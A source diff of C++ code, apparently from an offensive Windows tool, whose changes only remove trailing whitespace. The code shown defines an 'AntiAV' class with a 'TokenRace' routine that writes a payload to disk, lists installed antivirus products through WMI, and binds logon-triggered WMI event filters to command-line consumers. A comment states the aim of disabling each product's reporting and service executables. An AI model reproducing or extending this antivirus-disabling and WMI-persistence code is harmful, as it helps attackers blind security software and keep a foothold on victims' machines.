@@ -22,7 +22,7 @@
 class AntiAV
 {
 	BOOL IReady;
-	
+
 	AntiAV(COMWrapper& com_wrapper, WMIConnection& wmi_connection, QueryInterface& query_interface) :
 		ICom(com_wrapper), WMI(wmi_connection), IQuery(query_interface), IReady(FALSE)
 	{
@@ -35,19 +35,19 @@ class AntiAV
 	}
 
 public:
-	
+
 	class TokenRace
 	{
 	public:
 		BOOL IReady;
-		
+
 		TokenRace( COMWrapper& com_wrapper, WMIConnection& wmi_connection, QueryInterface& query_interface, AntiAV& antiav):
 			ICom(com_wrapper), WMI(wmi_connection), IQuery(query_interface), parent(antiav), IReady(FALSE)
 		{
 			if (ICom.IReady && WMI.IReady)
 				IReady = TRUE;
 		}
-		
+
 		BOOL WritePayload()
 		{
 			// Write the payload to disk
@@ -57,7 +57,7 @@ public:
 		BOOL CreateBinders()
 		{
 			HRESULT hres = NULL;
-			
+
 			for (auto& av : parent.vAVProducts)
 			{
 				// Definitions
@@ -72,7 +72,7 @@ public:
 				ILog("  Reporting: %ls\n", av.pathReportingExe.c_str());
 				ILog("  Timestamp: %ls\n", av.timestamp.c_str());
 
-				// Each AV product has two executables listed in the WMI. One for reporting, 
+				// Each AV product has two executables listed in the WMI. One for reporting,
 				// one for the service. We need to disable both of them
 
 				// Reporting
@@ -84,7 +84,7 @@ public:
 					sReportConsumerName += L"_Consumer";
 				if (!sReportFilterName.empty())
 					sReportFilterName += L"_Filter";
-				
+
 				BindingInterface IBindReport(ICom, WMI);
 
 				if (IBindReport.IReady)
@@ -93,7 +93,7 @@ public:
 						hres = S_OK;
 					else
 						hres = E_FAIL;
-					
+
 					if(SUCCEEDED(hres))
 						hres = IBindReport.CreateFilter(sReportFilterName,
 							L"SELECT * FROM __InstanceCreationEvent WITHIN 0.5 WHERE TargetInstance ISA 'Win32_LoggedOnUser'",
@@ -116,7 +116,7 @@ public:
 					sSignConsumerName += L"_Consumer";
 				if (!sSignFilterName.empty())
 					sSignFilterName += L"_Filter";
-				
+
 				BindingInterface IBindSign(ICom, WMI);
 
 				// If the interfaces are ready, we continue
@@ -127,14 +127,14 @@ public:
 						hres = S_OK;
 					else
 						hres = E_FAIL;
-					
+
 					// If either string is empty we skip
 					// Otherwise we set the filter for each
 					if (SUCCEEDED(hres))
 						hres = IBindSign.CreateFilter(sSignFilterName,
 							L"SELECT * FROM __InstanceCreationEvent WITHIN 0.5 WHERE TargetInstance ISA 'Win32_LoggedOnUser'",
 							L"root/cimv2");
-						
+
 					// Create the consumers
 					if (SUCCEEDED(hres))
 						hres = IBindSign.CreateCommandLineConsumer(sSignConsumerName, sPathSigner, L"");
@@ -154,9 +154,9 @@ public:
 			WMIConnection& WMI;
 			QueryInterface& IQuery;
 			AntiAV& parent;
-			
+
 	};
-	
+
 
 
 	private:
@@ -165,5 +165,5 @@ public:
 		QueryInterface& IQuery;
 		AVProduct avProduct;
 		std::vector<AVProduct> vAVProducts;
-		
+
 };
